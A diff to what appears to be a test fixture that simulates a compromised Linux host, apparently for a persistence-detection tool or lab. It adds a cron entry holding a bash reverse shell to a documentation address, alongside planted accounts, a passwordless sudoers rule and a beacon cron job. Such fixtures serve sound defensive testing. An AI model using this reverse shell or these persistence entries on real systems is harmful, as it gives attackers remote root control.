@@ -78,6 +78,8 @@ LAB.update({
     + "ubuntils-lab-root:x:0:0::/root:/usr/sbin/nologin\n",
     "/etc/shadow": STOCK_SHADOW + "ubuntils-lab:!:19000::::::\nubuntils-lab-root:!:19000::::::\n",
     "/etc/cron.d/ubuntils-lab": "0 0 31 2 * root /tmp/ubuntils-lab/beacon\n",
+    "/etc/cron.d/ubuntils-lab-revshell":
+        "0 0 31 2 * root bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'\n",
     "/var/spool/cron/crontabs/ubuntils-lab": "0 0 31 2 * sudo /usr/bin/true ubuntils-lab\n",
     "/etc/sudoers.d/ubuntils-lab": "ubuntils-lab ALL=(ALL) NOPASSWD: ALL\n",
     "/home/ubuntils-lab/.ssh/authorized_keys": 'command="/bin/true" ' + OTHER_KEY + "\n",
